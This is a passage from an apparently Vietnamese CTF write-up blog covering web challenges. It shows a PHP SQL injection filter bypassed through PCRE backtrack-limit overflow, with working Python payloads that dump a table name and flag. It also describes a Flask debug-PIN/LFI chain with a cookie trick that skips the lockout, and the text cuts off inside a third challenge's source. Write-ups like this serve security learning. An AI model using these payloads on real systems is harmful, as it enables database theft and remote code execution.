attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>POST<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\">        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>id<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\">        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></span><br><span class=\"highlight-line\">    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\"></span><br><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'/and|or|in|if|case|sleep|benchmark/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'Tet nhat ai lai hack nhau :(, very dangerous key word'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'/order.+?by|union.+?select/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'Tet nhat ai lai hack nhau :(, very dangerous statement'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"SELECT * FROM users WHERE id=\"</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span> <span class=\"token operator\">!==</span> <span class=\"token single-quoted-string string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'Hello '</span> <span class=\"token punctuation\">.</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span> <span class=\"token operator\">===</span> <span class=\"token single-quoted-string string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'This can\\'t be =]] Just put here for fun lul'</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">        <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">}</span></span><br><span class=\"token delimiter important\">?></span></span></code></pre>\n<p>Dòng 4 chúng ta có 1 hint của tác giả là phải sử dụng SQL Injection và leak được flag ở 1 column Y và table X nào đó mà chúng ta chưa biết trong database.</p>\n<p>Chúng ta bị chặn sử dụng câu lệnh <code>order by</code> và <code>union select</code>, đặc biệt lưu ý là cụm <code>in</code> cũng bị chặn, điều này dẫn đến sẽ có đôi chút khó khăn để ta lấy được table name và column name từ <code>information_schema</code> cũng như các database có prefix <code>innodb</code>.</p>\n<p>Nhưng chúng ta có thể bypass <code>preg_match</code> ở dòng 21 bằng cách làm cho PCRE (Engine xử lí Regular Expression trong PHP) xử lí input của ta, làm cho vượt quá backtrack limit mặc định <a href=\"https://www.php.net/manual/en/pcre.configuration.php\">của</a> <a href=\"https://stackoverflow.com/a/40426462\">PHP</a>. Bằng cách này, chúng ta có thể sử dụng <code>order by</code> hay <code>union select</code> dễ dàng.</p>\n<h3 id=\"get-table-name\">Get table name <a class=\"direct-link\" href=\"#get-table-name\">#</a></h3>\n<p>Mình quyết định sử dụng view <code>x$ps_schema_table_statistics_io</code> có trong database <code>sys</code> vì theo như <a href=\"https://dev.mysql.com/doc/refman/5.7/en/sys-schema-table-statistics.html\">MySQL documentation</a> mô tả:</p>\n<pre><code>These views summarize table statistics. By default, rows are sorted by descending total wait time (tables with most contention first).\n</code></pre>\n<p>và trong view này cũng có chứa 2 columns là <code>table_schema</code> và <code>table_name</code>.</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\">res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://45.77.240.178:8002/index.php'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">    <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'5 union/*'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">1000000</span> <span class=\"token operator\">+</span> <span class=\"token string\">'*/select 1,group_concat(table_name),3 from sys.x$ps_schema_table_statistics_io where table_schema=database()'</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></span></code></pre>\n<p><img src=\"https://i.imgur.com/xKdXXBS.jpg\" alt=\"\"></p>\n<p>Table name: <code>Th1z_Fack1n_Fl4444g_Tabl3</code></p>\n<h3 id=\"get-flag-without-knowing-column-name\">Get flag without knowing column name <a class=\"direct-link\" href=\"#get-flag-without-knowing-column-name\">#</a></h3>\n<p>Cách này đã được anh @tsug0d mô tả cực kì chi tiết và dễ hiểu trong <a href=\"https://tsublogs.wordpress.com/2017/06/07/pentest-qa-cung-tsu-5-sql-injection-without-information_schema/\">blog</a> của anh nên mình không dài dòng nữa. Get flag thôi!</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\">res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://45.77.240.178:8002/index.php'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">    <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'5 union/*'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">1000000</span> <span class=\"token operator\">+</span> <span class=\"token string\">'*/select 1,b,3 from (select 1 a, 2 b union select * from Th1z_Fack1n_Fl4444g_Tabl3 limit 1,1)x'</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></span></code></pre>\n<p><img src=\"https://i.imgur.com/iAgHzHz.jpg\" alt=\"\"></p>\n<h3 id=\"another-way-from-the-author\">Another way from the author <a class=\"direct-link\" href=\"#another-way-from-the-author\">#</a></h3>\n<p><img src=\"https://i.imgur.com/PVK8WBT.jpg\" alt=\"\"><br>\n🎉🎉🎉</p>\n<h2 id=\"the-prophet\">The Prophet <a class=\"direct-link\" href=\"#the-prophet\">#</a></h2>\n<pre><code>Wohoo, wanna hear some oracle?\n</code></pre>\n<p>Bài này chỉ có 1 chức năng cơ bản là đọc các file text có tên từ 1 - 5. Khi ta thử file <code>6.txt</code>, trang xuất hiện giao diện thông báo lỗi của Flask, chứng tỏ debug mode đang được enabled.<br>\nTrong giao diện báo lỗi, chúng ta có thể đọc 1 phần source code đã bị disclosed:</p>\n<p><img src=\"https://i.imgur.com/WvzEivs.jpg\" alt=\"\"></p>\n<p>Ta dễ dàng thấy được lỗi Local File Inclusion (LFI) trong đoạn code xử lí đọc file này. Biến <code>filename</code> được truyền thẳng đến hàm <code>open()</code> và nội dung được đưa ra ngoài thông qua hàm <code>render_template()</code>.</p>\n<p>Ngay lúc này, mình nhận ra rằng việc chúng ta có lỗi LFI sẽ dẫn đến việc có thể <a href=\"https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/\">generate</a> được debugger PIN code, sau đó sử dụng chức năng Interactive shell được tích hợp trong giao diện lỗi của Flask để có thể leverage lên RCE.</p>\n<p>Sau khi làm theo bài hướng dẫn generate PIN code và đã có được PIN, giờ chỉ việc submit PIN và RCE thôi, nhưng đời không như mơ và cuộc sống không dễ thở...</p>\n<p><img src=\"https://i.imgur.com/lP07KrD.jpg\" alt=\"\"></p>\n<p>Ok, tự trong đầu nghĩ chắc đây cũng là ý của tác giả thôi, chắc có chỗ nào đâu đó trong phần xử lí nhập PIN này có thể vượt được, let check it out. 🧐</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token comment\"># https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">def</span> <span class=\"token function\">hash_pin</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">,</span> text_type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">        pin <span class=\"token operator\">=</span> pin<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"replace\"</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>pin <span class=\"token operator\">+</span> <span class=\"token string\">b\"shittysalt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">DebuggedApplication</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">def</span> <span class=\"token function\">check_pin_trust</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> environ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br>        <span class=\"token triple-quoted-string string\">\"\"\"Checks if the request passed the pin test.  This returns `True` if the<br><span class=\"highlight-line\">        request is trusted on a pin/cookie basis and returns `False` if not.</span><br><span class=\"highlight-line\">        Additionally if the cookie's stored pin hash is wrong it will return</span><br><span class=\"highlight-line\">        `None` so that appropriate action can be taken.</span><br>        \"\"\"</span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>pin <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></span><br><span class=\"highlight-line\">        val <span class=\"token operator\">=</span> parse_cookie<span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>pin_cookie_name<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> val <span class=\"token keyword\">or</span> <span class=\"token string\">\"|\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> val<span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></span><br><span class=\"highlight-line\">        ts<span class=\"token punctuation\">,</span> pin_hash <span class=\"token operator\">=</span> val<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"|\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> ts<span class=\"token punctuation\">.</span>isdigit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> pin_hash <span class=\"token operator\">!=</span> hash_pin<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>pin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> PIN_TIME<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>ts<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">def</span> <span class=\"token function\">pin_auth</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">        <span class=\"token triple-quoted-string string\">\"\"\"Authenticates with the pin.\"\"\"</span></span><br><span class=\"highlight-line\">        exhausted <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></span><br><span class=\"highlight-line\">        auth <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></span><br><span class=\"highlight-line\">        trust <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>check_pin_trust<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># If the trust return value is `None` it means that the cookie is</span></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># set but the stored pin hash value is bad.  This means that the</span></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># pin was changed.  In this case we count a bad auth and unset the</span></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># cookie.  This way it becomes harder to guess the cookie name</span></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># instead of the pin as we still count up failures.</span></span><br><span class=\"highlight-line\">        bad_cookie <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> trust <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            self<span class=\"token punctuation\">.</span>_fail_pin_auth<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">            bad_cookie <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># If we're trusted, we're authenticated.</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">elif</span> trust<span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            auth <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># If we failed too many times, then we're locked out.</span></span><br><mark class=\"highlight-line highlight-line-active\">        <span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>_failed_pin_auth <span class=\"token operator\">></span> <span class=\"token number\">10</span><span class=\"token punctuation\">:</span></mark><br><mark class=\"highlight-line highlight-line-active\">            exhausted <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></mark><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># Otherwise go through pin based authentication</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            entered_pin <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"pin\"</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">if</span> entered_pin<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> self<span class=\"token punctuation\">.</span>pin<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">                self<span class=\"token punctuation\">.</span>_failed_pin_auth <span class=\"token operator\">=</span> <span class=\"token number\">0</span></span><br><span class=\"highlight-line\">                auth <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">                self<span class=\"token punctuation\">.</span>_fail_pin_auth<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">        rv <span class=\"token operator\">=</span> Response<span class=\"token punctuation\">(</span></span><br><span class=\"highlight-line\">            json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"auth\"</span><span class=\"token punctuation\">:</span> auth<span class=\"token punctuation\">,</span> <span class=\"token string\">\"exhausted\"</span><span class=\"token punctuation\">:</span> exhausted<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">            mimetype<span class=\"token operator\">=</span><span class=\"token string\">\"application/json\"</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> auth<span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            rv<span class=\"token punctuation\">.</span>set_cookie<span class=\"token punctuation\">(</span></span><br><span class=\"highlight-line\">                self<span class=\"token punctuation\">.</span>pin_cookie_name<span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">                <span class=\"token string\">\"%s|%s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> hash_pin<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>pin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">                httponly<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">            <span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">elif</span> bad_cookie<span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            rv<span class=\"token punctuation\">.</span>delete_cookie<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>pin_cookie_name<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">return</span> rv</span><br><span class=\"highlight-line\">    <span class=\"token comment\"># ...</span></span></code></pre>\n<p>Hai dòng được highlight là câu lệnh if kiểm tra điều kiện nếu nhập sai quá 10 lần thì <code>exhausted = True</code>, từ đó ta suy ra đã có người submit sai PIN khoảng 7 - 8 lần trước đó, để đến lượt mình thì sau khi thử 2 - 3 mã PIN thì nó lên 10. 😤</p>\n<p>Ok, quay lại nào. Vì câu điều kiện check nhập sai nằm trong nhánh <code>elif</code> nên chỉ cần 2 câu điều kiện ở trên đúng thì sẽ không thực thi. Biến <code>trust</code> được khởi tạo với value là return value của hàm <code>check_pin_trust()</code>, hàm này thực hiện get và parse cookie, kiểm tra PIN hash trong cookie có đúng với PIN hash trên server hay không, PIN expired time có hết hạn hay chưa.</p>\n<p>Vì chúng ta có thể control được cookie nên ta có thể tùy biến được cookie để vượt qua được việc check exhausted. Mình đã có quyền chạy Python code trên interactive shell rồi, tìm và đọc flag rất dễ dàng.</p>\n<h3 id=\"author-n%C3%B3i-g%C3%AC%3F\">Author nói gì? <a class=\"direct-link\" href=\"#author-n%C3%B3i-g%C3%AC%3F\">#</a></h3>\n<p>Ok, giải xong inbox author thì ảnh bảo chỉ cần generate PIN code là xong rồi RCE lấy flag thôi, tại lúc đó setup có vấn đề nên mới bị exhausted. 😤</p>\n<h2 id=\"meepwntube2050\">MeePwnTube2050 <a class=\"direct-link\" href=\"#meepwntube2050\">#</a></h2>\n<p><img src=\"https://i.imgur.com/PtWQV2F.jpg\" alt=\"\"></p>\n<pre><code>Source: https://drive.google.com/file/d/12MZJiMUCmLJ84-NypWByEzezkz4fx9RA/view\n</code></pre>\n<p>Bài này mình stuck đến ngày hôm sau mới nghĩ được hướng 😅</p>\n<p>Vì mình ngâm đi ngâm lại source code nhiều lần để chắc chắn rằng không có 1 lỗi nào có thể xảy ra, và đến khi mình chợt để ý 1 chi tiết nhỏ trong search.php:</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br><span class=\"highlight-line\"><span class=\"token keyword\">include</span> <span class=\"token double-quoted-string string\">\"dbconnect.php\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token variable\">$_IP</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'search'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_IP</span> <span class=\"token operator\">===</span> <span class=\"token double-quoted-string string\">\"45.76.148.212\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">            <span class=\"token comment\">//local only homie</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$Name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'search'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$_search</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$admin_conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$Execquery</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$admin_conn</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"SELECT id,Name FROM search WHERE Name LIKE '%<span class=\"token interpolation\"><span class=\"token variable\">$_search</span></span>%' LIMIT 8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$Result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Execquery</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;center>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;b>&lt;p style='font-size:20px; color:green'>\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$Result</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'Name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"&lt;/p>&lt;/b>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;iframe src='video\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$Result</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\".php' width='1200' height='300'>&lt;/iframe>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;/center>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">        <span class=\"token 